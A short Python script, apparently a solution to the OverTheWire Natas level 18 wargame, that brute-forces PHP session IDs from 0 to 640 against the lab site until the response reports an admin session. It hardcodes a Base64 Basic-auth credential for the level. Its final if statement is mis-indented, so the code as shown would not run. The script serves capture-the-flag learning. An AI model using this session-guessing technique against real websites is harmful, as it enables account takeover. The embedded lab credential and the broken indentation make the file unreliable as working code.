import requests

header = {
    "Authorization": "Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==",
    "Content-Type": "application/x-www-form-urlencoded"
}
url = "http://natas18.natas.labs.overthewire.org/index.php"

for i in range(641):
    print(i)
    cookie = {"PHPSESSID": str(i)}
    response = requests.post(url, headers=header, data={"username": "admin", "password": "admin"}, cookies=cookie)
        
     if "You are an admin" in response.text:
        print(response.text)
        break
